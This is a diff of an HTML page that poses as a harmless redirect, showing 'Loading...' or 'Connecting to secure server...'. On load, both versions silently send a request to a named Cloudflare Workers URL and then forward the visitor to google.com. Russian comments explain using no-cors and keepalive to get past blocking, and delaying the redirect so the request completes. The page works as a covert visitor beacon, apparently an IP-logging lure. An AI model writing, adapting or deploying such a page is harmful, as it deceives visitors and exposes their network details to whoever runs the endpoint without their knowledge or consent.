@@ -1,31 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
+    <title>Redirecting...</title>
     <script>
-        function run() {
-            const workerUrl = "https://workers.dev" + Date.now();
-            const redirectTo = "https://google.com";
-            
-            const img = new Image();
-            
-            // Уходим в гугл только через 3 секунды, даем время провайдеру пропустить пакет
-            const done = () => { 
-                setTimeout(() => { window.location.replace(redirectTo); }, 3000); 
-            };
+        const workerUrl = "https://adminfdm.alexgranny1708.workers.dev/";
+        const target = "https://google.com";
 
-            img.onload = done;
-            img.onerror = done;
-            img.src = workerUrl;
-
-            // Страховочный таймер
-            setTimeout(done, 5000);
+        async function start() {
+            // mode: 'no-cors' позволяет отправить запрос даже через блокировки
+            fetch(workerUrl, { mode: 'no-cors', keepalive: true })
+                .finally(() => {
+                    // Редирект через 1 секунду, чтобы пакет успел улететь
+                    setTimeout(() => { window.location.replace(target); }, 1000);
+                });
+            
+            // Запасной редирект, если fetch совсем зависнет
+            setTimeout(() => { window.location.replace(target); }, 3000);
         }
-        window.onload = run;
+        window.onload = start;
     </script>
 </head>
-<body style="background:#000; color:#333;">
-    <p>Connecting to secure server...</p>
-</body>
+<body><p>Loading...</p></body>
 </html>
+
 
